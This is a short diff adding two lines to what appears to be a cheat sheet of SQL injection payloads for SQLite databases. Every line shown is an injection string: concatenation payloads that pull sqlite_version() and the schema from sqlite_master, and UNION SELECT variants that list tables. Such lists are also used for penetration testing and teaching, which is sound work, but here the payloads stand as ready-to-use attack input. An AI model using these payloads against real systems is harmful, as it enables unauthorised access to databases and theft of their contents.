@@ -43,6 +43,8 @@
 .....................................................................................
 # For SQLi (SQLite)
 
+    1' || (select sqlite_version()));--
+    1' || (SELECT sql FROM sqlite_master));--
     'union select sqlite_version() -- -
     123' UNION SELECT 1, sqlite_version(), 3;--
     ' UNION SELECT table_name FROM sqlite_master --
